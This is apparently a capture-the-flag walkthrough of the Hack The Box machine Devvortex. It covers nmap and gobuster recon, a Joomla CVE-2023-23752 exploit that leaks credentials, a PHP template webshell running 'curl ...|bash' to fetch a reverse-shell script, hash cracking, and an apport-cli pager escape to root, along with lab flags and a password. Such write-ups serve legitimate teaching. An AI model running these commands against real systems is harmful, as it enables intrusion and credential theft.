## Task 1 : How many open TCP ports are listening on Devvortex?

Run an nmap scan on the target

```
sudo nmap -sV -Pn -T4 -oA initial_scan 10.129.229.146
```

<img width="733" height="227" alt="image" src="https://github.com/user-attachments/assets/bec02656-17b2-4d69-95d5-221cfbc0c415" />

<br>
<br>
> Answer : 2

---

## Task 2 : What subdomain is configured on the target's web server?

Visit the webserver

```
http://[target_ip]
```

We will be redirected to devvortex.htb but the page will not load.

We will need to add our target machine IP to /etc/hosts first.

<img width="453" height="179" alt="image" src="https://github.com/user-attachments/assets/927dbad5-7800-447d-bdb2-cfda00dcc836" />

<br>
<br>

This will allow us to reach devvortex.htb

<br>
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/34fd47e3-7f9f-4b51-911b-494d1b5d25e4" />
<br>
<br>

To discover the subdomain, we use gobuster vhost enumeration mode.

```
gobuster vhost -u http://devvortex.htb -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
```
<br>

<img width="1031" height="344" alt="image" src="https://github.com/user-attachments/assets/16363952-4720-4b4f-9cea-1910f55a5a5e" />
<br>
<br>
We discover dev.devvortex.htb
<br>
<br>
> Answer : dev.devvortex.htb

---

## Task 3 : What Content Management System (CMS) is running on dev.devvortex.htb?

We will add this subdomain to /etc/hosts in order to visit the webpage.

```
echo "[target_IP] [dev.devvortex.htb]" | sudo tee -a /etc/hosts
```

Now we can visit dev.devvortex.htb

<img width="1912" height="1020" alt="image" src="https://github.com/user-attachments/assets/e906d68b-2627-404a-94c0-aa63123eedee" />
<br>
<br>

We can try to sniff out interesting directories using gobuster

```
gobuster dir --url http://dev.devvortex.htb/ --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```
<br>

<img width="1124" height="527" alt="image" src="https://github.com/user-attachments/assets/b29088e8-f620-464c-a5f3-72a0b9614e20" />
<br>
<br>

We discover /administrator.

Visiting this directory,

<img width="1913" height="997" alt="image" src="https://github.com/user-attachments/assets/0767b8dc-7b8e-4e56-8e28-440a34965b37" />
<br>
<br>

We can see that joomla is the CMS.

<br>
> Answer : joomla

---

## Task 4 : Which version of Joomla is running on the target system?

Since the website's CMS is joomla, we can make use of [joomscan](https://github.com/OWASP/joomscan).

Since it is packaged into Kali Linux, I will use it.

```
joomscan -u http://dev.devvortex.htb
```
<br>
<img width="602" height="975" alt="image" src="https://github.com/user-attachments/assets/c3118b15-e0e0-4ceb-8ec7-89140309fc97" />

<br>
<br>
We can see that the joomla version is 4.2.6
<br>
<br>
> Answer : 4.2.6

---

## Task 5 : What is the 2023 CVE ID for an information disclosure vulnerability in the version of Joomla running on DevVortex?

Searching on google for "joomla 4.2.6 CVE" returns this result by [NIST](https://nvd.nist.gov/vuln/detail/cve-2023-23752)
<br>
<br>
<img width="1448" height="1155" alt="image" src="https://github.com/user-attachments/assets/3a1cd503-1324-4af1-a223-90849631520c" />
<br>
<br>
> Answer : CVE-2023-23752

 ---

## Task 6 : What is the lewis user's password for the CMS?

Searching on google for "CVE-2023-23752" lands me on this [github exploit](https://github.com/Youns92/Joomla-v4.2.8---CVE-2023-23752)
<br>
<br>
<img width="1244" height="683" alt="image" src="https://github.com/user-attachments/assets/dbc216a4-022d-46cb-94e4-f7bd4481b8d5" />
<br>
Download the exploit.sh to attacker machine
```
wget https://raw.githubusercontent.com/Youns92/Joomla-v4.2.8---CVE-2023-23752/refs/heads/main/exploit.sh
```
<br>
<br>
<img width="935" height="242" alt="image" src="https://github.com/user-attachments/assets/5bff6791-854e-44d0-9641-f2215b04c392" />
<br>
<br>
Update my Kali resources

```
sudo apt-get update
sudo apt-get install jq
```

Remember to change the permissions of exploit.sh
<br>
<br>
<img width="319" height="47" alt="image" src="https://github.com/user-attachments/assets/cf5f3e65-0e07-443e-ab76-4fc2b25295d0" />
<br>
<br>
Finally, run the exploit.

```
./exploit.sh http://dev.devvortex.htb
```

<br>
<br>
<img width="1024" height="525" alt="image" src="https://github.com/user-attachments/assets/390a65d1-e767-4194-b760-6edcd81920a5" />
<br>
<br>

> Answer : P4ntherg0t1n5r3c0n##

 ---
 
## Task 7 : What table in the database contains hashed credentials for the logan user?

We take our discovered credentials lewis:P4ntherg0t1n5r3c0n## and login via the /administrator directory
<br>
<br>
<img width="1263" height="711" alt="image" src="https://github.com/user-attachments/assets/4cd0605f-4120-4e2b-84bd-c5b1bbdd244a" />
<br>
<br>
We can access lewis' dashboard.
<br>
<br>
<img width="1920" height="1041" alt="image" src="https://github.com/user-attachments/assets/f60dd244-a4ba-413c-a1e6-a5d77aa6fd46" />
<br>
<br>
Navigate the site to System > Site Templates > Cassiopeia Details and Files.
<br>
<br>
<img width="1921" height="816" alt="image" src="https://github.com/user-attachments/assets/fff71c4d-262d-4f42-9418-348ea7aa5ba5" />
<br>
<br>
We can edit one of the unused php documents to give ourselves a reverse shell. I choose to use error.php.

We will use system() function to run curl and fetch a bash script from our attacker python webserver, executing and sending a reverse shell connection. 

```
<?php system("curl [attacker_IP]:8000/rev.sh|bash"); ?>
```
<br>
<img width="1743" height="762" alt="image" src="https://github.com/user-attachments/assets/67015752-7e9d-4546-a24f-860e43e3fb2f" />
<br>
<br>
Let's create rev.sh, the file which will be hosted on our attacker machine, which will then be called into the target machine to send a reverse connection back to us.
<br>
<br>

```
echo -e '#!/bin/bash\nsh -i >& /dev/tcp/[attacker_IP]/4444 0>&1' > rev.sh
```
With the preparation complete, we can now start a python webserver and host rev.sh

```
python3 -m http.server 8000
```
<img width="524" height="55" alt="image" src="https://github.com/user-attachments/assets/4ceeb09e-389e-4836-bbf5-2b98966481ef" />
<br>
<br>

We also need to start a netcat listener to catch the reverse connection.

```
nc -lnvp 4444
```
<img width="263" height="51" alt="image" src="https://github.com/user-attachments/assets/af160bf8-316a-4588-ab31-b60c53fd72c8" />
<br>

Now we can send a curl request to error.php to trigger the reverse-shell.

```
curl -k "http://dev.devvortex.htb/templates/cassiopeia/error.php/error"
```

<img width="538" height="87" alt="image" src="https://github.com/user-attachments/assets/64d75c22-b71f-456c-9300-1f7f98dc076c" />
<br>

We should receive a reverse-shell connection on our netcat listener.

Let's upgrade our shell.

```
script /dev/null -c bash
```

<img width="515" height="162" alt="image" src="https://github.com/user-attachments/assets/ebc2bdd7-4196-453f-98bb-0705dce4626c" />

Check which ports are listening locally
<br>

```
ss -tlpn
```
<img width="1108" height="268" alt="image" src="https://github.com/user-attachments/assets/a29d8e42-8ab8-48a9-b13d-e23349f3271f" />
<br>
<br>

Port 3306 and 33060 are SQL ports.

Attempt to login to SQL using previous lewis credentials.

<img width="670" height="291" alt="image" src="https://github.com/user-attachments/assets/6d6755ed-b57f-4871-9c4c-7dd9a5bf09cb" />
<br>
<br>
It works, and we gain access to the SQL database.
<br>

```
show databases;
```
<img width="249" height="174" alt="image" src="https://github.com/user-attachments/assets/59700fb7-e786-415c-b7d3-392957986151" />
<br>
<br>

```
use joomla;
```
<img width="539" height="101" alt="image" src="https://github.com/user-attachments/assets/f9589d2c-7790-47f7-a6a6-503e386edd25" />
<br>
<br>

```
show tables;
```
<img width="293" height="634" alt="image" src="https://github.com/user-attachments/assets/b8b323ba-107b-49a3-a17c-1c035a33e2b3" />
<br>
<br>

<img width="297" height="656" alt="image" src="https://github.com/user-attachments/assets/5546e678-387f-4bc7-9edf-6cd809be9811" />
<br>
<br>

This table seems the most likely to contain credentials of users.
<br>

> Answer : sd4fg_users

---

## Task 7 : What table in the database contains hashed credentials for the logan user?

To dump out all content from sd4fg_users
```
select * from sd4fg_users
```
<br>
<img width="1253" height="342" alt="image" src="https://github.com/user-attachments/assets/7e3bb3dd-fa32-494d-a83e-c49c56a7c188" />
<br>
<br>
We receive password hashes for Lewis and Logan.
<br>

```
hashid '[hash]'
```
<br>
<img width="596" height="105" alt="image" src="https://github.com/user-attachments/assets/408042d7-2067-474c-babd-761bbeac33aa" />
<br>
<br>
To identify the type of hash.

I'm guessing it is bcrypt.

Based on [hashcat wiki](https://hashcat.net/wiki/doku.php?id=example_hashes), bcrypt's code is 3200.

```
echo '[hash]' > hash
```

```
sudo hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt
```
<img width="1205" height="1093" alt="image" src="https://github.com/user-attachments/assets/00762f5e-a669-48df-b217-4897a806ae91" />
<br>
<br>

SSH into Logan's account using his newfound password

```
ssh logan@[target_IP]
```

<img width="592" height="499" alt="image" src="https://github.com/user-attachments/assets/2f156f73-84a9-438c-9176-bf7f5556287a" />
<br>
<br>

```
cat user.txt
```
<img width="284" height="123" alt="image" src="https://github.com/user-attachments/assets/ee708704-cfec-4290-9cbc-19d320c6520f" />
<br>
<br>

> User Flag : 02840db970aeb6c2cc5447b53fec0310

---

## Task 8 : What is the full path to the binary that the logan user can run with root privileges using sudo?

Run this command to see the sudo commands that Logan is allowed to run.
<br>
```
sudo -l
```
<img width="951" height="144" alt="image" src="https://github.com/user-attachments/assets/d7cde61d-f3c5-4de2-ac63-f2b9385b38de" />
<br>
<br>

> Answer : /usr/bin/apport-cli

---

## Task 9 : What is the 2023 CVE ID of the privilege escalation vulnerability in the installed version of apport-cli?

A google search of "apport-cli privesc CVE" returns the [NIST page](https://nvd.nist.gov/vuln/detail/CVE-2023-1326).
<br>
<img width="1448" height="885" alt="image" src="https://github.com/user-attachments/assets/5856c90f-5344-41e4-83a5-0868c1127b4f" />
<br>
<br>

> Answer : CVE-2023-1326

---

## Submit Root Flag : Submit the flag located in the root user's home directory.

To find out the currently running processes.
```
ps -ux
```

<img width="764" height="113" alt="image" src="https://github.com/user-attachments/assets/dafcdfe1-8f61-431b-a4a1-d597c103b8bf" />

Choose systemMD (PID 3019)
<br>

```
sudo /usr/bin/apport-cli -f -P 3019
```

<img width="1120" height="607" alt="image" src="https://github.com/user-attachments/assets/76fc83c0-1461-4d70-a782-0c59ab0a2b97" />


Answer Yes, Yes then "V".

After selecting view report, since "less" is configured as the default pager, we can run the !/bin/bash command and spawn an
interactive system shell as root .

```
!/bin/bash
```
<img width="871" height="582" alt="image" src="https://github.com/user-attachments/assets/9563e0ca-6be2-4b75-b60c-e0f9115bb62f" />
<br>
<br>



We have a root shell.

<img width="299" height="61" alt="image" src="https://github.com/user-attachments/assets/1bd4193c-39ce-4274-a5a0-9b3752cdd6e8" />
<br>
<br>
<img width="302" height="94" alt="image" src="https://github.com/user-attachments/assets/d4adc7d7-6751-4f2b-af4c-f1bb83a2b295" />
<br>
<br>

> Root Flag : d6c0e2680a90513afa373aa2e27edfc2

---




 


